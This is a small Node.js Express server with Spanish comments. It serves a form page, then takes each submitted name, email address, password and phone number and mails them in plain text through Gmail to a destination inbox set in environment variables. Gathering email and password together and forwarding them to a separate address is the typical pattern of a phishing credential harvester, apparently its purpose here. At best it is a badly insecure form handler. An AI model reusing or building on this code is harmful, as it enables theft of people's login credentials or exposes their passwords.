require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// 🔹 Servir archivos estáticos (HTML, CSS, JS)
app.use(express.static(path.join(__dirname, 'public')));

// 🔹 Ruta para enviar el formulario
app.post('/enviar-correo', async (req, res) => {
    const { nombre, apellido, correo, contrasena, telefono } = req.body;

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASS
        }
    });

    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: process.env.EMAIL_DESTINO,
        subject: 'Nuevo formulario recibido',
        text: `Nombre: ${nombre}\nApellido: ${apellido}\nCorreo: ${correo}\nContraseña: ${contrasena}\nTeléfono: ${telefono}`
    };

    try {
        await transporter.sendMail(mailOptions);
        res.json({ message: "Correo enviado con éxito" });
    } catch (error) {
        res.status(500).json({ message: "Error al enviar el correo", error });
    }
});

// 🔹 Ruta principal para servir el formulario
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 🔹 Iniciar servidor en Vercel
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor corriendo en http://localhost:${PORT}`);
});
